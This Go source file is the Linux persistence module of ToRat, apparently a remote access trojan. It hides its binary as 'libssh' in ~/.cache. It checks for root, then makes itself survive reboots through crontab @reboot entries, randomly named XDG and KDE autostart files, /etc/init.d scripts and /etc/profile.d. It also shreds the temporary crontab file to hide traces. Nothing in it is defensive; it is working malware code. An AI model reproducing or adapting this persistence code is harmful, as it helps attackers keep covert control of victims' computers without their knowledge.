package client

import (
	"log"
	"os"
	"path/filepath"

	"github.com/lu4p/ToRat/shared"
	"github.com/lu4p/ToRat/torat_client/crypto"
	"github.com/lu4p/shred"
)

const (
	sh = "#!/bin/sh\n"
)

var (
	Path         = filepath.Join(os.ExpandEnv("$HOME"), ".cache", "libssh")
	PathExe      = filepath.Join(Path, "libssh")
	HostnamePath = filepath.Join(Path, "token")
)

// CheckElevate checks whether the current process has administrator
// privileges
func CheckElevate() bool {
	if os.Geteuid() == 0 {
		log.Println("[CheckElevate] Running as ROOT")
		return true
	}
	log.Println("[CheckElevate] Running as USER")
	return false
}

// Persist makes sure that the executable is run after a reboot
func Persist(path string) {
	elevated := CheckElevate()
	if elevated {
		PersistAdmin(path)
		return
	}
	PersistUser(path)
}

// PersistAdmin persistence using admin privileges
func PersistAdmin(path string) {
	xdg(path, true)
	crontab(path)
	profileD(path)
	initD(path)
}

// PersistUser persistence using user privileges
func PersistUser(path string) {
	xdg(path, false)
	crontab(path)
	kdePlasma(path)
}

func crontab(path string) {
	err := os.WriteFile("tmp", []byte("@reboot "+path), os.ModePerm)
	if err != nil {
		return
	}

	shared.RunCmd("crontab tmp", false)
	shred.Conf{Zeros: true, Times: 1, Remove: true}.File("tmp")
}

func xdg(path string, admin bool) {
	conf := `[Desktop Entry]
Type=Application
Name=` + crypto.GenRandString() + `
Exec=` + path + `
Terminal=false`
	if admin {
		os.WriteFile("/etc/xdg/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
		return
	}

	os.WriteFile("~/.config/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
}

func kdePlasma(path string) {
	os.WriteFile("~/.config/autostart-scripts/"+crypto.GenRandString()+".sh", []byte(sh+path), 0777)
}

func initD(path string) {
	os.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 0755)
}

func profileD(path string) {
	os.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 0644)
}
